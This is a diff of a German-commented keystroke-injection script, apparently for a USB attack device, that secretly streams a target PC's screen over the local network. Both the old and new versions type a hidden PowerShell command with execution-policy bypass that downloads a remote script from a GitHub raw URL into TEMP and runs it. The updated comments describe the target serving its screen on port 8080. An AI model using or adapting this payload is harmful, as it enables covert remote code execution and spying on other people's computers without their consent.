@@ -1,15 +1,13 @@
-﻿REM Screenshare over LAN - V2 (Sender, OHNE Adminrechte)
-REM Nimmt den Bildschirm auf und schickt ihn per HTTP an einen Empfaenger im LAN.
-REM Kein Port, keine Firewall-Regel, kein UAC - laeuft als normaler Benutzer.
-REM
-REM Der Empfaenger wird automatisch im LAN gesucht (keine IP eintragen).
-REM Auf dem Empfaenger-PC Screenshare-Empfaenger.txt starten oder
-REM Screenshare-Receiver.cmd doppelklicken - dort steht dann die Browser-Adresse.
+﻿REM Screenshare over LAN - V2 (kein Empfaenger noetig)
+REM Das Ziel stellt seinen Bildschirm selbst per HTTP im LAN bereit.
+REM Nach dem Start zeigt ein CMD-Fenster die Adresse: http://<IP>:8080/
+REM Diese Adresse im Browser eines beliebigen Geraets im gleichen LAN oeffnen.
+REM Kein Adminrecht noetig (Firewall beim ersten Zugriff bestaetigen).
 REM Beenden: ESC auf dem Ziel 5 Sekunden halten.
 REM
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -ExecutionPolicy Bypass -w h -c $d=$env:TEMP+'\ps';md $d -Force;irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.9/s2.ps1 -OutFile $d\x2.ps1;& "$d\x2.ps1"
+STRING powershell -ExecutionPolicy Bypass -w h -c $d=$env:TEMP+'\ps';md $d -Force;irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v2.0/s2.ps1 -OutFile $d\x2.ps1;& "$d\x2.ps1"
 DELAY 500
 ENTER
